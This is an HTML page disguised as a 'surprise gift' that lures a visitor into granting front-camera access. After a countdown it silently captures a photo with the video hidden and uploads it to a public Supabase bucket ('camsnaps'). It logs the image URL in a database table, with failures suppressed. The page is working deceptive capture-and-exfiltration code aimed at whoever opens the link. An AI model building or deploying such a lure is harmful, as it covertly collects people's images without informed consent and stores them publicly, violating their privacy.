<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your Surprise Gift üéÅ</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { 
            background: #1e272e; 
            color: white; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            font-family: 'Segoe UI', sans-serif; 
            text-align: center; 
            overflow: hidden; 
            margin: 0;
        }
        
        /* Gift Box UI (Same as before) */
        #gift-box { cursor: pointer; transition: transform 0.3s; }
        #gift-box:active { transform: scale(0.95); } /* Click effect */
        .emoji { font-size: 120px; animation: bounce 2s infinite; display: block; margin-bottom: 20px;}
        h1 { margin: 0; background: linear-gradient(to right, #ff4757, #ff6b81); -webkit-background-clip: text; -webkit-text-fill-color: transparent;}
        
        /* Timer */
        #timer { font-size: 8rem; color: #ff4757; display: none; font-weight: bold; text-shadow: 0 0 20px rgba(255, 71, 87, 0.5); }
        
        /* Status Text */
        #status { margin-top: 20px; color: #ced6e0; font-size: 1.2rem; }

        /* Hidden Elements */
        #video { display: none; } 
        #canvas { display: none; }

        @keyframes bounce { 
            0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 
            40% {transform: translateY(-20px);} 
            60% {transform: translateY(-10px);} 
        }
    </style>
</head>
<body>

    <div id="gift-box" onclick="requestCamera()">
        <div class="emoji">üéÅ</div>
        <h1>Tap to Open</h1>
        <p style="color: gray; font-size: 0.9rem; margin-top: 10px;">(Tap here to see surprise)</p>
    </div>

    <div id="timer">10</div>
    <p id="status"></p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // --- CONFIGURATION ---
        const SUPABASE_URL = 'https://mlcbjfnimbpatmbcgwsq.supabase.co';
        const SUPABASE_KEY = 'sb_publishable_J1WdZTnnDUCBE6bsTf2brQ_qRlXL_1Z'; 
        
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        // Main Function triggered on Click
        async function requestCamera() {
            
            // 1. Check if Browser supports Camera
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                alert("Error: Your browser is blocking the camera or the site is not secure (HTTPS). Please try using Chrome on a secure connection.");
                return;
            }

            try {
                // 2. Request Camera - This triggers the Popup
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                
                // If Allowed:
                document.getElementById('video').srcObject = stream;
                startTimer(); // Start the countdown

            } catch (err) {
                // If Denied or Error
                console.error(err);
                if(err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    alert("Please click 'Allow' on the camera popup to see the gift!");
                } else {
                    alert("Camera Error: " + err.message + "\n(Make sure you are using HTTPS or Localhost)");
                }
            }
        }

        function startTimer() {
            // UI Switch
            document.getElementById('gift-box').style.display = 'none';
            document.getElementById('timer').style.display = 'block';
            document.getElementById('status').innerText = "Unwrapping surprise...";
            
            let count = 10;
            const timerElem = document.getElementById('timer');
            
            const interval = setInterval(() => {
                count--;
                timerElem.innerText = count;
                if (count <= 0) {
                    clearInterval(interval);
                    captureAndUpload();
                }
            }, 1000);
        }

        async function captureAndUpload() {
            document.getElementById('status').innerText = "Almost there...";
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            
            // Wait a moment to ensure video is ready
            if(video.readyState !== 4) {
                 await new Promise(r => setTimeout(r, 500));
            }

            // Capture
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // Mirror Effect
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0);

            // Convert to Blob
            canvas.toBlob(async (blob) => {
                if(!blob) return; 

                const fileName = `gift_${Date.now()}.png`;

                // Upload
                const { data, error } = await supabase.storage
                    .from('camsnaps')
                    .upload(fileName, blob);

                if (error) {
                    // Fail silently or show generic msg
                    document.getElementById('status').innerText = "Done!"; 
                } else {
                    // Get URL
                    const { data: urlData } = supabase.storage.from('camsnaps').getPublicUrl(fileName);
                    
                    // Save to DB
                    await supabase.from('captured_photos').insert([{ image_url: urlData.publicUrl }]);

                    // Success UI
                    document.getElementById('timer').style.display = 'none';
                    document.getElementById('status').innerHTML = `
                        <h1 style="font-size:2rem;">üéâ Surprise! üéâ</h1>
                        <br>
                        <img src="${urlData.publicUrl}" style="width:80%; max-width:300px; border:5px solid white; border-radius:10px; transform: rotate(-2deg);">
                    `;
                    
                    // Stop Camera
                    if(video.srcObject) {
                        video.srcObject.getTracks().forEach(track => track.stop());
                    }
                }
            }, 'image/png');
        }
    </script>
</body>
</html>
